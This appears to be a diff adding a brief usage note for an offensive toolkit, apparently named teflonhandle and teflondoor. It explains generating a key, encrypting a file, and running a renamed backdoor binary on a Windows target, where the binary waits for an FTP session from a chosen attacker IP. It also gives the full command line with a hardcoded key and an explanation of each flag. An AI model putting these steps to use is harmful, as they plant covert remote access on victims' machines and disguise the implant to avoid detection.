@@ -1,0 +1,16 @@
+# You need to general a key to encrypt your file
+teflonhandle /g 
+
+# Now you will encrypt your file
+teflonhandle INFILE OUTFILE /k <KEY>
+
+# This is the binary you put on a windows target; change the name
+# and run it like this.  It will start up, and you have 60 secs to initiat
+# a session with the ftp server before it auto-shutdown
+
+run -command "teflondoor /i 172.10.10.151 /d 5 /k 0xC564D2FC30A199BFE944ED6AA88244AD /t 60"
+
+i = IP address allowed to connect to teflondoor
+d = delay in seconds between status messages
+k = key
+t = timeout, server will die if no activity within time specified
